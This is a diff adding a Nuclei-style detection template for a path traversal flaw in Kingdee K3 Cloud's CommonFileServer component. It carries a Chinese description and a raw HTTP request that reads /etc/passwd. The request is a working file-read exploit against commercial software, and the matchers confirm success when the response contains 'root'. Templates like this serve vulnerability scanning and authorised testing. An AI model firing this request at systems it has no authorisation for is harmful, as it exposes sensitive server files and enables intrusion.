@@ -1,0 +1,24 @@
+id: kingdee-k3-cloud-file-read
+
+info:
+  name: "金蝶云星空 CommonFileServer 组件路径遍历漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    金蝶云星空 CommonFileServer 组件存在路径遍历漏洞，攻击者可通过构造恶意请求读取任意文件内容。该缺陷源于对文件路径参数的校验机制不充分，允许绕过安全限制访问系统敏感文件。
+  tags: 金蝶云星空
+
+http:
+- raw:
+  - |
+    GET /CommonFileServer/etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root'
